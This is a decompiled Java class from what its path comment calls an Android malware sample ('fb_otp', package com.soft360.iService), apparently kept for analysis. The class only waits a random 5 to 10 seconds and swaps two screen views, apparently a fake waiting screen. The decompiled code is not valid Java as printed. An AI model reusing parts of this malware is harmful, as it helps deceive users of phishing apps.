import android.os.AsyncTask;
import android.view.View;
import com.soft360.iService.MainActivity;
import java.util.concurrent.TimeUnit;

public final class do
  extends AsyncTask
{
  private do(MainActivity paramMainActivity) {}
  
  private static Void a()
  {
    try
    {
      int i = (int)(Math.random() * 5.0D + 5.0D);
      TimeUnit.SECONDS.sleep(i);
      return null;
    }
    catch (InterruptedException localInterruptedException)
    {
      for (;;)
      {
        localInterruptedException.printStackTrace();
      }
    }
  }
  
  protected final void onPreExecute()
  {
    this.a.findViewById(2131427340).setVisibility(8);
    this.a.findViewById(2131427351).setVisibility(0);
  }
}


/* Location:              /home/enzo/Documents/hacking/malwares/fb_otp/classes-dex2jar.jar!/do.class
 * Java compiler version: 6 (50.0)
 * JD-Core Version:       0.7.1
 */